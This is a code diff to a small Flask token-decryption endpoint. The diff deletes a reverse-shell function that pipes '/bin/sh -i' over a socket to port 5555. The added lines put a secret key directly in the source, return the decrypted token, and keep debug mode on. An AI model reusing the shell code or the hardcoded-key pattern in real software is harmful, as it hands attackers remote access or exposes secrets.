@@ -6,31 +6,21 @@ from nacl.encoding import Base64Encoder
 
 app = Flask(__name__)
 
-def shell():
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect(("",5555))
-    os.dup2(s.fileno(),0)
-    os.dup2(s.fileno(),1)
-    s.dup2(s.fileno(),2)
-    p=subprocess.call(["/bin/sh","-i"])
-			
-
-
 @app.route('/', methods=['POST'])
 def index():
     data = request.get_json()
     print(data)
     if data["token"] == "":
-            return "Unauthorized"
-    
-    key = os.getenviron['SECRET_KEY']
+        return jsonify({'auth': 'fail', 'token': ''})
+   
+    key = b'\xa0K\x89w\xa9\xe6\xed\xdb\xa4\xacj\xec\xbb\x16Q\x82\x96\n|i\x95^?0\x1b/\xb22x\x13\xdb\x0e'
     box = secret.SecretBox(key)
     
     try:
-        decrypted_token = box.decrypt(token.encode(), encoder=Base64Encoder)
-            
+        decrypted_token = box.decrypt(data['token'].encode(), encoder=Base64Encoder)
+        return jsonify({'auth': 'success', 'token': decrypted_token})
     except:
-        return "Unauthorized"
+        return jsonify({'auth': 'fail', 'token': ''})
     
 def run():
     app.run(host='127.0.0.1', port=5001, debug=True)
